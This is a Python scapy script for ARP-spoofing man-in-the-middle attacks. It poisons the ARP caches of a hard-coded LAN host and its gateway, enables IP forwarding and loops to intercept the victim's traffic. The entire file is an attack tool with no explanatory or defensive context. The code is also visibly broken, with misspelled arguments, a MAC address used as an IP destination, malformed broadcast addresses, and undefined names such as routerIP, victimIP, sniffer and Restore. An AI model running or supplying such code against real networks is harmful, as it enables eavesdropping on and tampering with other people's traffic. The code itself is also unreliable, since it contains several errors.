import os
import sys
from scapy.all import *

interface="wlan0"
target_ip="192.168.0.58"
gateway_ip="192.168.0.1"

def MACsnag(IP):
    ans,unans=arping(IP)
    for s,r in ans:
        return r[Ether].src

def spoof(gateway_ip,target_ip):
    target_mac=MACsnag(target_ip)
    gateway_mac=MACsnag(gateway_ip)
    send(ARP(op=2,psrc=gateway_ip,psdt=target_ip,hwdst=target_mac))
    send(ARP(op=2,psrc=target_ip,pdst=gateway_mac,hwdst=gateway_mac))

def restore(gateway_ip,target_ip):
    target_mac=MACsnag(target_ip)
    gateway_mac=MACsnag(gateway_ip)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_mac, hwsrc=gateway_mac,hwdst="ff:ff:ff:ff:ff:ff:"),count=4)
    send(ARP(op=2, psrc=gateway_ip, psdt=target_ip, hwsrc=target_mac,hwdst="ff:ff:ff:ff:ff:ff:"),count=4)

def MiddleMan():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    while 1:
        try:
            spoof(routerIP, victimIP)
            time.sleep(1)
            sniffer()
        except KeyboardInterrupt:
            Restore(routerIP, victimIP)
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            sys.exit(1)


if __name__ == "__main__":
    MiddleMan()


